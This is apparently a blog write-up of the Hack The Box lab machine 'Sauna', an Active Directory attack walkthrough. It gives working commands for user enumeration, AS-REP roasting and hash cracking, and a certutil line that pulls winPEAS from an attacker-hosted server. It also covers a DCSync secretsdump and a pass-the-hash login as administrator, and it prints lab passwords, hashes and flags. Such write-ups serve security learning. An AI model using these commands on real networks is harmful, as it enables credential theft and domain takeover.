+++
title = "HTB - Sauna"
date = 2024-11-30
+++


Sauna runs very similar to [[Forest]], in that we need to enumerate AD attack vectors in a methodical and intentional way. Attackers will exhaust enumeration tactics, ASREP roast with usernames against the KDC, crack hashes, and use credentials to access a low-privilege shell. Then, attackers will need to exercise judgement with account migrations and privilege escalation opportunities provided by tools like Bloodhound. Let's get into it.
### Scan
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49689/tcp open  unknown
49696/tcp open  unknown
```

I had `nmapAutomator` running for a good while, but I just included the very basic scan here, because we've got all we need. `88` tips us off to the fact that we're dealing with a domain controller, and we can progressively work through our DNS, SMB, RPC, and LDAP enumeration protocols. First, though, we see a web server on 80, and I'd like to start there while my scan fleshes out a bit more.

### Enumeration

When we logon we get a website for Egotistical-Bank, and as we peruse around, we don't find much. There are a few contact forms, but there is nothing much to note. I ran `feroxbuster` and `wfuzz` in order to dig a bit deeper, and even though I stumbled upon some directories, most were met by `403` errors, and didn't look to have much aside from a default web server. There were also no subdomains that I could find. 

```
feroxbuster -u http://10.10.10.175:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n

404      GET       29l       95w     1245c Auto-filtering found 404-like response and create new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://10.10.10.175/images => http://10.10.10.175images/
200      GET      385l     1324w    14226c http://10.10.10.175/css/slider.css
200      GET      684l     1814w    38059c http://10.10.10.175/single.html
200      GET      122l      750w    60163c http://10.10.10.175/images/t4.jpg
200      GET     2168l     4106w    37019c http://10.10.10.175/css/style.css
200      GET      325l      770w    15634c http://10.10.10.175/contact.html
200      GET      683l     1813w    32797c http://10.10.10.175/index.html
200      GET     2337l     3940w    37414c http://10.10.10.175/css/font-awesome.css
200      GET      470l     1279w    24695c http://10.10.10.175/blog.html
200      GET      640l     1767w    30954c http://10.10.10.175/about.html
200      GET      144l      850w    71769c http://10.10.10.175/images/t2.jpg
200      GET      138l      940w    76395c http://10.10.10.175/images/t3.jpg
200      GET      111l      661w    50106c http://10.10.10.175/images/t1.jpg
301      GET        2l       10w      150c http://10.10.10.175/Images => http://10.10.10.175Images/
200      GET      268l     2037w   191775c http://10.10.10.175/images/skill2.jpg
200      GET      657l     3746w   345763c http://10.10.10.175/images/skill1.jpg
200      GET     8975l    17530w   178152c http://10.10.10.175/css/bootstrap.css
200      GET      389l     1987w   159728c http://10.10.10.175/images/ab.jpg
200      GET      683l     1813w    32797c http://10.10.10.175/
301      GET        2l       10w      147c http://10.10.10.175/css => http://10.10.10.175/cs/
301      GET        2l       10w      149c http://10.10.10.175/fonts => http://10.10.10.175/onts/
301      GET        2l       10w      150c http://10.10.10.175/IMAGES => http://10.10.10.175IMAGES/
301      GET        2l       10w      149c http://10.10.10.175/Fonts => http://10.10.10.175/onts/
301      GET        2l       10w      147c http://10.10.10.175/CSS => http://10.10.10.175/CS/

──(root㉿kali)-[/home/li0t]
└─# wfuzz -c -f sub-fighter -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://sauna.htb -H "HOST:FUZZ.sauna.htb" --hc 404 --hh 32797

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sauna.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                    
=====================================================================


Total time: 64.34377
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 77.53663

```

Next, I opted for a zone transfer through DNS. My scan had confirmed the domain name of the AD environment, being `egotistical-bank.local`. Using this, I tried to transfer with `dig axfr @10.10.10.175 sauna.htb`and `dig axfr @10.10.10.175 egotistical-bank.local`. My attempts were unsuccessful, and I think it was a syntax issue, but I moved on regardless.

My next steps were to enumerate any potential SMB shares with tools like `smbmap` and `smbclient`, but using the common scripts as denoted in [[Forest]], null authentication failed also.

My last thought was to use `ldapsearch` for enumeration purposes, but I couldn't get my common script to return anything either. I then remembered that `nmap` has scripts for this, and sure enough, `nmap -n -sV --script "ldap* and not brute" 10.10.10.175` returned a lot of information about the domain, including a potential foothold into the network.(In retrospect, `ldapsearch -x -h 10.10.10.175 -s base namingcontexts` would've led you down the same path - syntax was just messed up. Once you find name, add `-b 'DC=EGOTISTICAL-BANK,DC-LOCAL` to replace the `-s`)

```
   namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

I was stuck here for a while, and I was hellbent on going further with `Hugo Smith` as our way into the network. Upon some research, though, I'd come across a tool for enumeration that I wasn't familiar with.

### Initial Access

`Kerbrute` is a way to brute force usernames against the KDC for access to TGT's. This is helpful when we don't have anything on the network, and we don't have usernames either.  I had to troubleshoot my tool for a few hours, as I had the wrong configuration installed, and then upon getting the `git` repo, I had to alter the `makefile` to fit the `arm64` requirement that Kali on the M2 Chip requires.

(Download the repo, and when before you `make build`, edit the make file and change the ARCH to arm64, and change the `OS` to `linux`. Save and use `make linux`, then give the file permissions with `chmod 777 ./kerbrute-linux-arm64`. Run `./kerbrute-linux-arm64` should work!)

The script to enumerate is as follows:

`./kerbrute_linux_arm64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/SecLists-master/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175`

(I want to note as well, that there is an `nmap` script available for this as well. The caveat is that it's very slow comparatively. It will also throw memory errors should the list be too big, like the one above. `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb='/usr/share/seclists/SecLists-master/Usernames/KerberosAZnoDot' 10.10.10.175`. This can serve as another way to skin the cat, albeit frustratingly.)

<img alt="Image" async src="images/Screenshot 2024-09-15 at 3.27.53 PM.png" width="800px"></img>

We get provided with user 'fsmith' and TGT! We can ASREP roast now. Interestingly, though, if we try to crack this we'll get no hits. While the program identified which user can be granted TGT access, it misidentifies the ticket. Not a problem, though. Now that we know which user it is, we can use `GetNPUsers.py` from `impacket` to do the work for us and provide a valid ticket. Then, we can crack with `john`.

`python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.175 egotistical-bank.local/fsmith`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

<img alt="Image" async src="images/Screenshot 2024-09-16 at 9.24.39 AM.png" width="800px"></img>

Now that we've got credentials, we can use `evil-winrm` to access PowerShell. Remember, this is only contingent upon the `wsman` and `winrm` ports being available.

We can navigate to the user desktop for our flag.

`USER:31e6cb87fa28ca802791cfaa71095dfd`

### Privilege Escalation

To elevate our privileges, I tried my hand at the remote python ingester for Bloodhound, as I'd never used it before. The script is as follows:

`bloodhound-python -d egotistical-bank.local -u fsmith -p Thestrokes23 -ns 10.10.10.175 -c all`

I'll say as well, it worked well. If there's a reason one doesn't want to transfer another ingester like SharpHound to the victim, this is a fine and easy alternative.

After dumping the contents into the software for my POC graph and map, I used `winPEAS` as well to enumerate a bit further. Of course, transferring the file didn't come without its fair share of issues. After lots of trial and error, I think the problem is making sure it's the correct kind of file, and saving it to an outfile on the victim machine. I used `python3 -m http.server 80` to host, and then used:

``

 Use `.\winPEAS.exe` to execute the file when ready.

(Putting `certutil` here if nothing else works as a backup for whoever needs: `certutil.exe -urlcache -split -f (http://10.10.10.10/winpeas.exe) winpeas.exe`)

`winPEAS` constantly punches above it's weight, and this time is no different. An account called `svc_loanmgr` has credentials stored in plaintext.

<img alt="Image" async src="images/Screenshot 2024-09-15 at 4.44.51 PM.png" width="800px"></img>

`svc_loanmgr | Moneymakestheworldgoround!`

With this, we can not only migrate accounts, but update our plan of action in bloodhound for a new strategy. 

Upon doing so, I recognized that the account has privileges akin higher access accounts, and we'll be able to abuse this with a DcSync attack, just like we did with Forest. 

Because the path forward is very simple, and root is a `secrets-dump` away, I went for the flag. In a thorough engagement, be sure to re-enumerate with the new credentials. Always.

We can use the following command to try and get NTLM hashes for all user accounts, now that we have the permissions to do so:

`impacket-secretsdump EGOTISTICAL-BANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 5.13.08 PM.png" width="800px"></img> 

SYNTAX IS VERY TOUCHY! Be careful here, as the only way I could get this to work was by prepending the command with `impacket`, as shown. Something must be wrong with the library I built using the `git` repo, but that's a problem for another day.

With the hashes, we can now pass the `administrator` hash using `evil-winrm` for access to the DC.

`ruby /var/lib/gems/3.1.0/gems/evil-winrm-3.5/evil-winrm.rb -i 10.10.10.175 -u administrator -p aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e`

<img alt="Image" async src="images/Screenshot 2024-09-15 at 5.15.57 PM.png" width="800px"></img>

Nothing better...

`ROOT:b91c1572435d61d7d5c74b64c8278415`

#easy #windows #manual 











